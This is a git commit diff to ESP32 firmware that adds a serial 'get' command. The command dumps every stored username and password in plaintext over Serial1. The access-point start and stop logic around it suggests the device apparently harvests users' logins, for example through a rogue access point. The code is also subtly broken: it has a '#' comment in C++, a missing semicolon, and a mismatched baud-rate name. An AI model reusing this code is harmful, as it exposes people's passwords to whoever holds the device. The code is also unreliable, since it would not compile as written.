3f878df1dab4e34c97ee8ee77ff4d36303649b01
Marcello <62134093+Moriarty2002@users.noreply.github.com>
2025-06-06 10:02:05 +0200

    Configure to send users credentials from persistent storage

--- esp32/main.ino
+++ esp32/main.ino
@@ -7,11 +7,30 @@
 #define BAUD_RATE 9600
 
 String received_command = "";
+Preferences preferences;
 
 void setup() {
   Serial.begin(115200);
   Serial1.begin(baud_rate, SERIAL_8N1, RX, TX);
   Serial.println("Ready to receive command via Serial1 (USART).");
+
+  if (!SPIFFS.begin(true)) {
+      Serial.println("SPIFFS mount failed!");
+      return;
+  }
+}
+
+void send_all_credentials() {
+    preferences.begin("creds", true);
+    int count = preferences.getUInt("count", 0);
+    Serial1.printf("Sending %d stored credentials:\n", count);
+    for (int i = 0; i < count; i++) {
+        String user = preferences.getString("user" + String(i), "");
+        String pass = preferences.getString("pass" + String(i), "");
+        # TODO: trasmettere tramite seriale a controllore, qui faccio solo PRINT
+        Serial1.println("USER:" + user + ", PASS:" + pass);
+    }
+    preferences.end();
 }
 
 void loop() {
@@ -27,6 +46,8 @@ void loop() {
         ap_start();
       } else if (received_command == "stop" && !ap_is_active()) {
        ap_stop()
+      } else if (received_command == "get" && !ap_is_active()) {
+        send_all_credentials();
       }
 
       received_command = "";
